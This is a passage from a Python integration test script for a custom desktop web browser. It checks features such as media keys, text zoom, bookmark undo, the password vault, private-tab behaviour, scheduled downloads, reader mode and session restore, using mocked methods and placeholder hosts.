check("a terminal editor opens in a terminal, a window editor as it is",
      _c1 == ["/usr/bin/kitty", "-e", "/usr/bin/nvim"]
      and _c2 == ["/usr/bin/kate"] and _c3 is None, str((_c1, _c2, _c3)))

# ===== batch 82: the MPRIS adaptors answer to their interfaces ==========
_mp82 = getattr(B, "mpris", None)
_ifaces = []
if _mp82 is not None and _mp82.HAVE_DBUS:
    for _cls in (_mp82.Root, _mp82.Player):
        _mo = _cls.staticMetaObject
        _at = _mo.indexOfClassInfo("D-Bus Interface")
        _ifaces.append(_mo.classInfo(_at).value() if _at >= 0 else "")
check("the media-key adaptors declare the MPRIS interfaces",
      _ifaces == ["org.mpris.MediaPlayer2", "org.mpris.MediaPlayer2.Player"],
      str(_ifaces))

# ===== batch 83: a JSON chat component is previewed on chat's grey ======
_mm = br.minimessage_html('{"text":"Welcome","color":"white"}')
check("a JSON chat component is previewed on a dark background like chat",
      "background:#2b2b2b" in _mm and "Welcome" in _mm, _mm[:120])

# ===== batch 84: text zoom scales each text by itself, no compounding ====
_tz = br.new_tab(url=None); H.spin(200)
H.load(_tz, srv.url("/zoomtext")); H.spin(300)
_pay84 = dict(br.a11y_payload(), textZoom=150)
H.js(_tz, B.A11Y_JS.replace("A11YWANT", json.dumps(_pay84)), B.APP_WORLD_ID)
H.spin(300)
H.js(_tz, "var s = document.createElement('span'); s.id = 'late';"
          " s.textContent = 'late'; document.getElementById('p').appendChild(s); 1",
     B.MAIN_WORLD_ID)
H.spin(900)
_sz = json.loads(H.js(_tz, "JSON.stringify(['p','in','h1','h2','late'].map("
                           "function (i) { return parseFloat(getComputedStyle("
                           "document.getElementById(i)).fontSize); }))",
                      B.MAIN_WORLD_ID) or "[]")
check("text zoom scales each text by its own size and never compounds",
      len(_sz) == 5 and abs(_sz[0] - 24) < 0.6 and abs(_sz[1] - 24) < 0.6
      and abs(_sz[2] - 48) < 0.6 and abs(_sz[3] - 36) < 0.6
      and abs(_sz[4] - 24) < 0.6, str(_sz))
H.js(_tz, B.A11Y_JS.replace("A11YWANT", json.dumps(br.a11y_payload())),
     B.APP_WORLD_ID)
_close_if_open(_tz)

# ===== batch 85: full-screen reveal polls from F11; a reset shows the bar
_rv_was = br.config.get("revealInFullscreen", "__absent__")
br.config["revealInFullscreen"] = True
br.set_fullscreen(True); H.spin(300)
_pt85 = getattr(br, "_peek_timer", None)
_on85 = _pt85 is not None and _pt85.isActive()
br.set_fullscreen(False); H.spin(300)
_off85 = _pt85 is None or not _pt85.isActive()
if _rv_was == "__absent__":
    br.config.pop("revealInFullscreen", None)
else:
    br.config["revealInFullscreen"] = _rv_was
check("with reveal-in-fullscreen on, F11 starts the top-edge poll, and "
      "leaving stops it", _on85 and _off85, str((_on85, _off85)))
_ap85 = {k: br.config.get(k, "__absent__") for k in br.APPEARANCE_KEYS}
br.set_auto_hide_chrome(True); H.spin(200)
br.reset_appearance(keep_backup=False); H.spin(200)
_shown85 = getattr(br, "_chrome_shown", None)
for _k, _v in _ap85.items():
    if _v != "__absent__":
        br.config[_k] = _v
br.load_custom_themes()
br.apply_theme(br.config.get("theme", B.DEFAULT_THEME), save=False)
check("an appearance reset brings a hidden toolbar back", _shown85 is True,
      str(_shown85))

# ===== batch 86: what the second review of the shipped batches found =====
# a transcript whose cues are all blank makes no empty note
class _Desk86:
    saved = []

    def save_note(self, **k):
        _Desk86.saved.append(k)
        return {}
_rd86, _rt86 = br.desk, br.transcript
br.desk = lambda: _Desk86()
br.transcript = lambda view=None, then=None: then([{"t": 5, "text": "  "},
                                                  "junk"])
try:
    br.transcript_to_note(view=br.current())
finally:
    br.desk, br.transcript = _rd86, _rt86
check("a transcript of blank cues makes no empty note", _Desk86.saved == [],
      str(_Desk86.saved))
# the inspector, closed with its own X, opens again with one press
_iv86 = br.new_tab(url=None); H.spin(200)
H.load(_iv86, srv.url("/twhome"))
H.wait_for(lambda: "/twhome" in _iv86.url().toString(), 8000)
br.tabs.setCurrentWidget(_iv86); H.spin(200)
br.toggle_inspector(); H.spin(300)
_d1 = getattr(_iv86, "_devtools", None)
if _d1 is not None:
    _d1.close(); H.spin(400)
br.toggle_inspector(); H.spin(300)
_d2 = getattr(_iv86, "_devtools", None)
_open86 = _d2 is not None and _d2.isVisible()
br.toggle_inspector(); H.spin(300)
check("the inspector closed with its window's X opens again on one press",
      _d1 is not None and _open86, str((_d1 is not None, _open86)))
_close_if_open(_iv86)
# a setting already back at its default does not return with an undo
_ap86 = {k: br.config.get(k, "__absent__")
         for k in ("nightDim", "customThemes", "appearanceBackup", "theme")}
br.config["nightDim"] = 30
br.reset_appearance()
br.config["theme"] = br.config.get("theme") or B.DEFAULT_THEME
br.config["uiSize"] = 15
br.reset_appearance()
br.undo_reset_appearance()
_nd86 = br.config.get("nightDim")
for _k, _v in _ap86.items():
    if _v == "__absent__":
        br.config.pop(_k, None)
    else:
        br.config[_k] = _v
br.config.pop("uiSize", None)
br.load_custom_themes()
br.apply_theme(br.config.get("theme", B.DEFAULT_THEME), save=False)
br.refresh_page_look()
check("an undo after two resets does not bring back a dimmer reset before",
      not _nd86, str(_nd86))
# the slow-connection menu's mark goes when he switches offline himself
_of86 = br.config.get("offline", False)
br.config["offline"] = False
br.throttle(view=br.current(), profile="offline")
br.work_offline(False)                    # his own switch
br.work_offline(True)                     # and on again, by him
br.throttle(view=br.current(), profile="off")
_still86 = br.config.get("offline")
br.config["offline"] = _of86
br.config.pop("offlineByThrottle", None)
check("throttle Off after he switched offline himself leaves it on",
      _still86 is True, str(_still86))
# "none here" from a private tab beats a parent domain's agent
_ag86 = dict(br.agent_sites())
br.agent_sites()["example.com"] = "firefox"
B._PRIVATE_AGENTS["a.example.com"] = ""
_none86 = br.agent_for("a.example.com", private=True)
B._PRIVATE_AGENTS.pop("a.example.com", None)
br.agent_sites().clear(); br.agent_sites().update(_ag86)
check("no agent chosen in a private tab is none, whatever the parent says",
      _none86 == "", str(_none86))
# the Settings autoplay switch while lite mode is on
_lt86 = {k: br.config.get(k, "__absent__")
         for k in ("liteMode", "blockAutoplay", "blockAutoplayOwn")}
br.config.update(liteMode=False, blockAutoplay=True)
br.lite_mode(True)
br.bridge.setSetting("blockAutoplay", "false")
_during86 = br.config.get("blockAutoplay")
br.lite_mode(False)
_after86 = br.config.get("blockAutoplay")
for _k, _v in _lt86.items():
    if _v == "__absent__":
        br.config.pop(_k, None)
    else:
        br.config[_k] = _v
br.apply_web_attributes()
check("lite mode keeps autoplay blocked when Settings is touched meanwhile,"
      " and then gives his answer back", _during86 is True
      and _after86 is False, str((_during86, _after86)))
# a pre-restore copy is not one of the fourteen daily backups
_bdir86 = br.bookmark_backup_dir()
_bdir86.mkdir(parents=True, exist_ok=True)
(_bdir86 / "bookmarks-2001-02-02.json").write_text(json.dumps(
    [{"id": 1, "type": "link", "title": "o", "url": "https://o.example/",
      "parent": 0}]))
_bm86 = list(br.bookmarks)
br.bookmarks = [{"id": 9, "type": "link", "title": "n", "url": "https://n.example/",
                 "parent": 0}]
br.restore_bookmark_backup("bookmarks-2001-02-02.json")
_before86 = sorted(p.name for p in _bdir86.glob("bookmarks-before-restore-*.json"))
br.bookmarks = _bm86
br.save_bookmarks()
for _p in list(_bdir86.glob("bookmarks-before-restore-*.json")) + [
        _bdir86 / "bookmarks-2001-02-02.json"]:
    try:
        _p.unlink()
    except OSError:
        pass
check("a restore keeps what was there under its own before-restore name",
      len(_before86) == 1, str(_before86))
# OCR that cannot write its picture still answers
_real_mk = B.tempfile.mkstemp
_real_rt86 = br.record_tools
br.record_tools = lambda: {"tesseract": "/bin/true"}
B.tempfile.mkstemp = lambda *a, **k: (_ for _ in ()).throw(OSError("full"))
_ocr86 = {}
try:
    br.read_text_from_image(image=B.QImage(4, 4, B.QImage.Format.Format_RGB32),
                            then=lambda s: _ocr86.update(v=s))
finally:
    B.tempfile.mkstemp = _real_mk
    br.record_tools = _real_rt86
check("OCR that cannot write its picture still answers its caller",
      _ocr86.get("v") == "", str(_ocr86))
# a popup menu whose refused popups were all filtered says so
_pw86 = list(getattr(br, "_blocked_popups", []) or [])
br._blocked_popups = [{"url": "file:///etc/hostname"}]
_pm86 = [a.text() for a in br.popup_menu().actions()]
br._blocked_popups = _pw86
check("a popup menu with nothing it can offer says nothing was refused",
      br._ui_str("popupNone") in _pm86, str(_pm86))

# ===== third pass, part 1: secrets, scheduled and running downloads =====
br.bridge._last_generated = "gen-pw-87"
B.QGuiApplication.clipboard().clear()
_g87 = json.loads(br.bridge.copyGenerated(br._page_key) or "{}")
_md87 = B.QGuiApplication.clipboard().mimeData()
check("a generated password is copied as a secret and cleared later",
      _g87.get("ok") is True and _md87 is not None
      and _md87.hasFormat("x-kde-passwordManagerHint")
      and getattr(br, "_clip_mine", None) == "gen-pw-87", str(_g87))
B.QGuiApplication.clipboard().clear()
if br.vault is not None and not br.vault_locked():
    _e87 = br.vault.set_entry("review87.example", "https", "u87", "pw87")
    _log87 = []
    _real_na = br.vault.note_access
    br.vault.note_access = lambda i, f, what="revealed": _log87.append((f, what))
    try:
        br.bridge.revealField(br._page_key, (_e87 or {}).get("id", ""), "password")
    finally:
        br.vault.note_access = _real_na
    check("a password shown in the manager is written in the access log",
          ("password", "revealed") in _log87, str(_log87))
_sd_was = br.config.get("dlLater", "__absent__")
# a list of its own: an earlier test can leave the key as something else,
# and scheduled_downloads() then hands back a throwaway list
br.config["dlLater"] = [{"url": srv.url("/twhome"), "name": "x.html",
                         "when": 1}]
_real_rt87 = br._real_tabs
# the 30 s timer would start it from a normal tab during the spins below
# (the window still has one), and the explicit tick found an empty list --
# every window's timer: the windows earlier sections left open share this
# config, and one of them started the download
# (closed ones too: a closed window is hidden, not deleted, and its own
# timer runs on -- br.windows() lists only the open ones)
_dlt87 = [w._dl_later for w in B.QApplication.topLevelWidgets()
          if isinstance(w, B.Browser) and w._dl_later.isActive()]
for _t87 in _dlt87:
    _t87.stop()
_pv87 = br.new_tab(private=True); H.spin(300)
br.tabs.setCurrentWidget(_pv87); H.spin(200)
br._real_tabs = lambda *a, **k: [(br.tabs.indexOf(_pv87), _pv87)]
try:
    _st87 = br._schedule_tick()
finally:
    br._real_tabs = _real_rt87
    for _t87 in _dlt87:
        _t87.start()
_left87 = list(br.scheduled_downloads())
if _sd_was == "__absent__":
    br.config.pop("dlLater", None)
else:
    br.config["dlLater"] = _sd_was
_close_if_open(_pv87)
check("a scheduled download with no normal tab to start from stays scheduled",
      _st87 == 0 and len(_left87) == 1, str((_st87, _left87)))
br.downloads.append({"id": "dl87", "state": "active", "name": "big.iso",
                     "url": "https://x.example/big.iso"})
_f87 = br.forget_download("dl87", ask=False)
_kept87 = any(e.get("id") == "dl87" for e in br.downloads)
br.downloads[:] = [e for e in br.downloads if e.get("id") != "dl87"]
check("a download still arriving cannot be forgotten from the list",
      _f87 is False and _kept87, str((_f87, _kept87)))

# ===== third pass, part 2: element hider, own pages, restored sessions ===
_sel88 = B.page_guard.selector_for([
    {"tag": "DIV", "id": "main", "class": ""}, {"tag": "UL", "id": "", "class": ""},
    {"tag": "LI", "id": "", "class": "item"}])
_html88 = B.page_guard.selector_for([{"tag": "HTML", "id": "", "class": ""}])
check("the element hider names the clicked element, never an ancestor alone",
      _sel88 == "#main > ul > li.item" and _html88 == "", str((_sel88, _html88)))
_cfg88 = dict(br.config, guardNoWebRTC=True)
_src88 = B.page_guard.source(_cfg88, own="/opt/browser/")
check("the guard script skips the browser's own pages",
      '"own":"/opt/browser/"' in _src88
      and "location.pathname.indexOf(R.own) === 0) return" in _src88)
_sess_was = list(br.sessions)
if not any(e.get("sid") == "rv88" for e in br.sessions):
    br.sessions.append({"name": "Review 88", "sid": "rv88"})
_r88 = br.open_tab_state([{"u": srv.url("/twhome"), "s": "rv88"}],
                         lazy=False)
H.spin(400)
_s88 = getattr(_r88[0], "session", None) if _r88 else None
for _v in _r88:
    _close_if_open(_v)
br.sessions[:] = _sess_was
check("a restored tab goes back into the virtual browser it was in",
      _s88 == "rv88", str(_s88))

# ===== third pass, part 3: private handoffs, webmail, video cap ==========
_asked89 = []
_real_ask89, _real_tor89 = br._ask_handoff, br.torrent_handoff
br._ask_handoff = lambda kind, target, site, shown_site=None: (
    _asked89.append((site, shown_site)) or True)
br.torrent_handoff = lambda t: True
_hs89 = json.dumps(br.config.get("handoffSites") or {})
br.config.setdefault("handoffSites", {})["torrent@secret89.example"] = True
try:
    br.page_handoff("torrent", "magnet:?xt=urn:x", "secret89.example",
                    private=True)
finally:
    br._ask_handoff, br.torrent_handoff = _real_ask89, _real_tor89
    br.config["handoffSites"] = json.loads(_hs89)
check("a private tab's handoff always asks and offers no 'always'",
      _asked89 == [("", "secret89.example")], str(_asked89))
_pv89 = br.new_tab(private=True); H.spin(300)
_mt89 = []
_real_mu, _real_nt89 = br.mailto_url, br.new_tab
br.mailto_url = lambda m: "https://mail.example/compose?to=a"
br.new_tab = lambda *a, **k: _mt89.append(bool(k.get("private"))) or None
try:
    br.open_mailto("mailto:a@b.example", _pv89)
finally:
    br.mailto_url, br.new_tab = _real_mu, _real_nt89
_close_if_open(_pv89)
check("webmail from a private tab opens in a private tab", _mt89 == [True],
      str(_mt89))
_caps89 = []
_real_cv = br.cap_video
br.cap_video = lambda h, *a, **k: _caps89.append(h)
try:
    br.bridge.setSetting("videoCap", "0")
    br.bridge.setSetting("videoCap", "720")
finally:
    br.cap_video = _real_cv
    br.config.pop("videoCap", None)
check("'as it comes' takes the video cap off instead of setting 480p",
      _caps89 == [720], str(_caps89))

# ===== third pass, part 4: bookmark undo with a reused id, start page ====
_bm90 = list(br.bookmarks)
br.bookmarks = [{"id": 10, "type": "link", "title": "A", "url": "https://a90.example/",
                 "parent": 0, "t": 1000}]
br.save_bookmarks()
br.remove_bookmark(10)
br.bookmarks.append({"id": 10, "type": "link", "title": "B",
                     "url": "https://b90.example/", "parent": 0, "t": 2000})
br.undo_bookmark_delete()
_urls90 = sorted((b.get("url"), b.get("id")) for b in br.bookmarks)
br.bookmarks = _bm90
br.save_bookmarks()
check("undo brings a bookmark back even when a new one took its id",
      [u for u, _i in _urls90] == ["https://a90.example/", "https://b90.example/"]
      and len({i for _u, i in _urls90}) == 2, str(_urls90))
_sp90 = br.new_tab(); H.spin(1000)
H.wait_for(lambda: jsq(_sp90, "typeof loadExtras", B.MAIN_WORLD_ID)
           == "function", 8000)
check("the start page answers when its settings change",
      H.js(_sp90, "typeof window.__settingsChanged", B.MAIN_WORLD_ID)
      == "function")
_close_if_open(_sp90)

# ===== third pass, part 5: CSV history, guard masks, agent waits ========
_vd91 = _Path(_tempfile.mkdtemp(dir=str(B.CONFIG_FILE.parent)))
_v91 = B.PasswordVault(_vd91)
_v91.set_entry("example.com", "https", "bob", "old-A")
_v91.import_csv("url,username,password\nhttps://example.com,bob,new-B\n")
_it91 = _v91.get("example.com", "bob") or {}
check("a CSV import keeps the password it replaces in the history",
      _it91.get("password") == "new-B"
      and any(h.get("password") == "old-A" for h in _it91.get("history") or []),
      str([h.get("password") for h in _it91.get("history") or []]))
_src91 = B.page_guard.source(dict(br.config, guardFingerprint=True))
check("the fingerprint guard masks WebGL2 too and nudges audio once",
      "WebGL2RenderingContext" in _src91 and "new WeakSet()" in _src91
      and "((seed % 7) + 1)" in _src91)
import agent_bridge as _ab91
_ev91 = br.new_tab(url=None); H.spin(200)
H.load(_ev91, srv.url("/twhome"))
H.wait_for(lambda: "/twhome" in _ev91.url().toString(), 8000)
_bad91 = H.js(_ev91, _ab91._EXISTS_JS % json.dumps("div["), B.APP_WORLD_ID)
_ok91 = H.js(_ev91, _ab91._EXISTS_JS % json.dumps("p"), B.APP_WORLD_ID)
_close_if_open(_ev91)
check("an agent wait on a broken selector says so instead of 'gone'",
      _bad91 == "bad-selector" and _ok91 is True, str((_bad91, _ok91)))

# ===== third pass, part 6: history undo, torrents, handoffs, notes ======
_h92 = list(br.history)
_n92 = int(B.time.time())
br.history = [{"url": "https://a92.example/", "title": "a", "t": _n92 - 10}]
br.forget_history_site("a92.example")
br.delete_history_entries(["https://nothing92.example/"])
_u92 = br.undo_history_delete()
_back92 = [e["url"] for e in br.history]
br.history = _h92
br.save_history()
check("a delete of nothing keeps the undo of the delete before it",
      _back92 == ["https://a92.example/"], str((_u92, _back92)))
_tor92 = []
_real_prog92 = br._torrent_program
br._torrent_program = lambda: "/bin/true"
_real_popen92 = B.subprocess.Popen
B.subprocess.Popen = lambda args, **k: _tor92.append(args) or type("P", (), {})()
try:
    br.torrent_handoff("https://x.example/get/file.torrent?token=abc")
finally:
    br._torrent_program = _real_prog92
    B.subprocess.Popen = _real_popen92
check("a .torrent address with a query is handed to the torrent client",
      len(_tor92) == 1, str(_tor92))
_cd92 = B.notes.Desk(_Path(_tempfile.mkdtemp(dir=str(B.CONFIG_FILE.parent))))
(_cd92.folder / "collections").mkdir(parents=True, exist_ok=True)
(_cd92.folder / "collections" / "Reading List.md").write_text("- a\n")
_names92 = _cd92.collections()
check("a collection dropped into the folder can be shown and deleted",
      "Reading List" in _names92 and _cd92.collection("Reading List") == "- a\n"
      and _cd92.delete_collection("Reading List"), str(_names92))

# ===== third pass, part 7: the agenda's UTC times and all-day spans ======
_ics93 = _Path(_tempfile.mkdtemp(dir=str(B.CONFIG_FILE.parent))) / "cal.ics"
_day93 = B.time.strftime("%Y%m%d")
_noon_utc = B.calendar.timegm(B.time.strptime(_day93 + "120000", "%Y%m%d%H%M%S"))
_local_hm = B.time.strftime("%H:%M", B.time.localtime(_noon_utc))
_y93 = B.time.strftime("%Y%m%d", B.time.localtime(B.time.time() - 86400))
_t93 = B.time.strftime("%Y%m%d", B.time.localtime(B.time.time() + 86400))
_ics93.write_text(
    "BEGIN:VCALENDAR\r\nBEGIN:VEVENT\r\nDTSTART:%sT120000Z\r\n"
    "SUMMARY:Lunch with a very long name that is folded onto \r\n the next line\r\n"
    "END:VEVENT\r\nBEGIN:VEVENT\r\nDTSTART;VALUE=DATE:%s\r\nDTEND;VALUE=DATE:%s\r\n"
    "SUMMARY:Trip\r\nEND:VEVENT\r\nEND:VCALENDAR\r\n" % (_day93, _y93, _t93))
_ag93 = br.agenda_today(path=str(_ics93))
check("the agenda shows a UTC event at his own clock time and an all-day span",
      any(r["at"] == _local_hm and "folded onto the next line" in r["name"]
          for r in _ag93) and any(r["name"] == "Trip" for r in _ag93),
      str(_ag93))

# ===== review of 86-93: folders in the bookmark undo, collection writes ===
_bm94 = list(br.bookmarks)
br.bookmarks = [{"id": 20, "type": "folder", "title": "Old", "url": "",
                 "parent": 0, "t": 1000},
                {"id": 21, "type": "link", "title": "in", "url": "https://in94.example/",
                 "parent": 20, "t": 1001}]
br.save_bookmarks()
br.remove_bookmark(20)
br.bookmarks.append({"id": 20, "type": "folder", "title": "New", "url": "",
                     "parent": 0, "t": 2000})
br.undo_bookmark_delete()
_titles94 = sorted(b.get("title") for b in br.bookmarks if b.get("type") == "folder")
_child94 = [b for b in br.bookmarks if b.get("url") == "https://in94.example/"]
_old94 = [b for b in br.bookmarks if b.get("title") == "Old"]
br.bookmarks = _bm94
br.save_bookmarks()
check("undo brings back a deleted folder whose id a new folder took",
      _titles94 == ["New", "Old"] and _child94 and _old94
      and _child94[0].get("parent") == _old94[0].get("id"),
      str((_titles94, _child94, _old94)))
_cd94 = B.notes.Desk(_Path(_tempfile.mkdtemp(dir=str(B.CONFIG_FILE.parent))))
(_cd94.folder / "collections").mkdir(parents=True, exist_ok=True)
(_cd94.folder / "collections" / "Reading List.md").write_text("- a\n")
_cd94.add_to_collection("Reading List", "b")
check("adding to a hand-made collection adds to that file",
      sorted(p.name for p in (_cd94.folder / "collections").glob("*.md"))
      == ["Reading List.md"] and "- b" in _cd94.collection("Reading List"),
      str(sorted(p.name for p in (_cd94.folder / "collections").glob("*.md"))))

# ===== fourth pass, part 1: pop-out, private generator, prompts, notes ===
_pw95 = br.new_window(); H.spin(900)
_only95 = [_pw95.tabs.widget(i) for i in range(_pw95.tabs.count())
           if not _pw95._is_header(_pw95.tabs.widget(i))]
_mini95 = _pw95.pop_out_tab(_pw95.tabs.indexOf(_only95[0])) if _only95 else None
H.spin(400)
try:
    _alive95 = _pw95.isVisible() and any(
        not _pw95._is_header(_pw95.tabs.widget(i)) for i in range(_pw95.tabs.count()))
except RuntimeError:
    _alive95 = False
check("popping out the only tab keeps the window, with a fresh tab",
      _mini95 is not None and _alive95, str((_mini95 is not None, _alive95)))
try:
    if _mini95 is not None:
        _mini95.close()
    H.spin(300)
    _pw95.close()
except RuntimeError:
    pass
H.spin(400)
if br.vault is not None and not br.vault_locked():
    _gp95 = br.new_tab(private=True); H.spin(300)
    H.load(_gp95, srv.url("/pwform"))
    H.wait_for(lambda: "/pwform" in _gp95.url().toString(), 8000)
    _before95 = len(br.vault.logins())
    _vpw95 = br.config.get(B.VAULT_PASSWORD_KEY, "__absent__")
    br.config[B.VAULT_PASSWORD_KEY] = True
    _g95 = {}
    br.generate_for_page(view=_gp95, then=lambda s: _g95.update(v=s))
    H.wait_for(lambda: "v" in _g95, 8000)
    _after95 = len(br.vault.logins())
    if _vpw95 == "__absent__":
        br.config.pop(B.VAULT_PASSWORD_KEY, None)
    else:
        br.config[B.VAULT_PASSWORD_KEY] = _vpw95
    _close_if_open(_gp95)
    check("a password generated in a private tab is filled but not saved",
          bool(_g95.get("v")) and _after95 == _before95,
          str((bool(_g95.get("v")), _before95, _after95)))
B.QGuiApplication.clipboard().clear()
br._pw_pending = {"host": "h95.example", "scheme": "https",
                  "username": "u95", "password": "secret95"}
br._password_prompt("h95.example", "u95", False); H.spin(100)
_held95 = br._pw_pending is not None
br._hide_toast(); H.spin(100)
check("a save-password question pushed away lets go of the password",
      _held95 and br._pw_pending is None, str(br._pw_pending))
_pn95 = br.new_tab(private=True); H.spin(300)
H.load(_pn95, srv.url("/twhome"))
H.wait_for(lambda: "/twhome" in _pn95.url().toString(), 8000)
_notes_was = json.dumps(br.config.get("pageNotes") or {})
br.page_note(text="private reminder 95", view=_pn95)
_read95 = br.page_note(view=_pn95)
_disk95 = json.dumps(br.config.get("pageNotes") or {})
_close_if_open(_pn95)
H.spin(300)
check("a page note in a private tab is kept in memory, not in config.json",
      _read95 == "private reminder 95" and _disk95 == _notes_was,
      str((_read95, _disk95 == _notes_was)))

# ===== fourth pass, part 2: reader, bar, volume, calls, MPRIS, wiki ======
_rv96 = br.new_tab(url=None); H.spin(200)
H.load(_rv96, srv.url("/art96"))
H.wait_for(lambda: "art96" in _rv96.url().toString(), 8000)
# the document itself, not just its address: under a CPU quota the
# reader ran on a page still loading and found no article
H.wait_for(lambda: jsq(_rv96, "document.readyState === 'complete' && "
                       "document.body.innerText.length > 300"), 9000)
br.tabs.setCurrentWidget(_rv96); H.spin(200)
br.reader_mode(_rv96)
H.wait_for(lambda: jsq(_rv96, "!!document.getElementById('__readercss')",
                       B.MAIN_WORLD_ID), 5000)
_on96 = jsq(_rv96, "!!document.getElementById('__readercss')", B.MAIN_WORLD_ID)
_w96 = br.reader_options().get("width")
br.set_reader_option("width", 52); H.spin(500)
H.wait_for(lambda: jsq(_rv96, "!!document.getElementById('__readercss')",
                       B.MAIN_WORLD_ID), 3000)
_still96 = jsq(_rv96, "!!document.getElementById('__readercss')", B.MAIN_WORLD_ID)
br.set_reader_option("width", _w96 or 70)
br.reader_mode(_rv96); H.spin(300)
_close_if_open(_rv96)
check("changing a reader option keeps the reader on",
      _on96 is True and _still96 is True, str((_on96, _still96)))
_bmk96 = list(br.bookmarks)
br.bookmarks.append({"id": 9696, "type": "link", "title": "zzbm96 tool",
                     "url": "", "js": "alert(1)", "parent": 0})
_rows96 = br._own_suggestions("zzbm96")
br.bookmarks = _bmk96
check("a bookmarklet is no address-bar row that searches for nothing",
      not any("zzbm96" in r for r in _rows96), str(_rows96))
_vv96 = br.new_tab(url=None); H.spin(200)
H.load(_vv96, srv.url("/vid"))
H.wait_for(lambda: "/vid" in _vv96.url().toString(), 8000)
H.js(_vv96, "document.getElementById('v').volume = 0.5; 1", B.MAIN_WORLD_ID)
br.media_tool("volumeto", view=_vv96, level=0.8); H.spin(300)
_vol96 = H.js(_vv96, "document.getElementById('v').volume", B.MAIN_WORLD_ID)
_close_if_open(_vv96)
check("a remembered volume is set, not stepped to", _vol96 == 0.8, str(_vol96))
_res96 = []
_real_rac = br.resume_after_call
br.resume_after_call = lambda: _res96.append(1) or 0
_live_was96, _paused_was96 = br._media_live, list(br._paused_for_call)
br._media_live = [{"view": br.current(), "kind": "microphone"}]
br._paused_for_call = [br.current()]
try:
    br._media_seen([])
finally:
    br.resume_after_call = _real_rac
    br._media_live, br._paused_for_call = _live_was96, _paused_was96
check("music paused for a call plays again when the call ends", _res96 == [1],
      str(_res96))
_did96 = []
class _FakeB96(B.QObject):
    pass
_fb96 = _FakeB96()
_fb96.browser = type("Br", (), {"media_do": staticmethod(lambda a: _did96.append(a))})()
if getattr(B, "mpris", None) is not None and B.mpris.HAVE_DBUS:
    _pl96 = B.mpris.Player(_fb96)
    _pl96.Next(); _pl96.Previous()
check("the media keys' next and previous ask for the Media Session's actions",
      _did96 == ["nexttrack", "previoustrack"], str(_did96))
_wk96 = []
_pw96 = br.new_tab(private=True); H.spin(300)
_real_nt96, _real_op96 = br.new_tab, br.open_panel
br.new_tab = lambda *a, **k: _wk96.append(("tab", bool(k.get("private")))) or object()
br.open_panel = lambda *a, **k: _wk96.append(("panel",)) or True
try:
    br.wiki_lookup("Creeper farm", view=_pw96)
finally:
    br.new_tab, br.open_panel = _real_nt96, _real_op96
_close_if_open(_pw96)
check("the wiki from a private tab opens a private tab, not the panel",
      _wk96 == [("tab", True)], str(_wk96))

# ===== fourth pass, part 3: typed LAN addresses, close focus, split view ==
_lp97 = br.new_tab(url=None); H.spin(200)
H.load(_lp97, srv.url("/twhome"))
H.wait_for(lambda: "/twhome" in _lp97.url().toString(), 8000)
_pg97 = _lp97.page()
_pg97.url = lambda: B.QUrl("https://news97.example/")
_NT97 = B.QWebEnginePage.NavigationType
_typed97 = _pg97.acceptNavigationRequest(B.QUrl("http://192.168.1.1/"),
                                         _NT97.NavigationTypeTyped, True)
_link97 = _pg97.acceptNavigationRequest(B.QUrl("http://192.168.1.1/"),
                                        _NT97.NavigationTypeLinkClicked, True)
del _pg97.url
_close_if_open(_lp97)
check("typing a home-network address is allowed; a page's link to it is not",
      _typed97 is True and _link97 is False, str((_typed97, _link97)))
_cf97 = br.config.get("closeFocus", "right")
br.config["closeFocus"] = "last"
_a97 = br.new_tab(url=None); H.spin(150)
_c97 = br.new_tab(url=None); H.spin(150)
_e97 = br.new_tab(url=None, switch=False); H.spin(150)
br.tabs.setCurrentWidget(_a97); H.spin(150)
br.tabs.setCurrentWidget(_c97); H.spin(150)
br.close_tab(br.tabs.indexOf(_c97), ask=False); H.spin(200)
_land97 = br.current()
br.config["closeFocus"] = _cf97
check("closing a tab with 'the one before' goes back to the tab before",
      _land97 is _a97, str(br.tabs.indexOf(_land97)))
for _t in (_a97, _e97):
    _close_if_open(_t)
_sv97 = br.new_tab(url=None); H.spin(200)
H.load(_sv97, srv.url("/timers"))
H.wait_for(lambda: "/timers" in _sv97.url().toString(), 8000)
br.split_view(index=br.tabs.indexOf(_sv97)); H.spin(400)
br._save_groups(quiet=False)
_saved97 = json.dumps(br.config.get("sessionTabs") or {})
br.close_split(); H.spin(200)
_close_if_open(_sv97)
check("the split view's tab is in the saved session", "/timers" in _saved97,
      _saved97[:200])

# ===== fourth pass, part 4: one browser's cookie wipe is that browser's ===
_coe98 = {k: br.config.get(k, "__absent__") for k in ("clearOnExit", "cookiesWipePending")}
br.config["clearOnExit"] = {"work98": ["cookies"]}
br.config.pop("cookiesWipePending", None)
br.clear_on_exit_per_session()
_mark98 = br.config.get("cookiesWipePending")
for _k, _v in _coe98.items():
    if _v == "__absent__":
        br.config.pop(_k, None)
    else:
        br.config[_k] = _v
check("one virtual browser's clear-cookies-on-exit marks only its own jar",
      _mark98 == ["browser-s-work98"], str(_mark98))

# ===== fourth pass, part 5: the session-keeping window hands the job on ===
_w1_99 = br.new_window(); H.spin(700)
_w1_99._session_timer.start()
B.QApplication.instance().aboutToQuit.connect(_w1_99._save_groups)
_w2_99 = br.new_window(); H.spin(700)
_w1_99.close(); H.spin(400)
_handed99 = (not _w1_99._session_timer.isActive()
             and _w2_99._session_timer.isActive())
try:
    B.QApplication.instance().aboutToQuit.disconnect(_w2_99._save_groups)
except (TypeError, RuntimeError):
    pass
_w2_99._session_timer.stop()
try:
    _w2_99.close()
except RuntimeError:
    pass
H.spin(400)
check("closing the window that writes the session hands the job to another",
      _handed99, str(_handed99))

# ===== fourth pass, part 6: restart env, Settings gamepad switch =========
_env100 = {k: B.os.environ.get(k) for k in (B._GPU_MARK, "BROWSER_GPU_CARD")}
B.os.environ[B._GPU_MARK] = "1"
B.os.environ["BROWSER_GPU_CARD"] = "card1"
_sd100 = []
_real_sd100 = B.QProcess.startDetached
_real_quit100 = B.QApplication.instance().quit
B.QProcess.startDetached = staticmethod(lambda *a, **k: _sd100.append(
    (B.os.environ.get(B._GPU_MARK), B.os.environ.get("BROWSER_GPU_CARD"))) or True)
B.QApplication.instance().quit = lambda: None
try:
    br.restart()
finally:
    B.QProcess.startDetached = _real_sd100
    B.QApplication.instance().quit = _real_quit100
    for _k, _v in _env100.items():
        if _v is None:
            B.os.environ.pop(_k, None)
        else:
            B.os.environ[_k] = _v
    B.os.environ.pop("BROWSER_RESTART_WAIT", None)
check("a restart lets the next run choose the graphics card again",
      _sd100 == [(None, None)], str(_sd100))
_gp100 = br.config.get("gamepadOn", False)
br.bridge.setSetting("gamepadOn", "true")
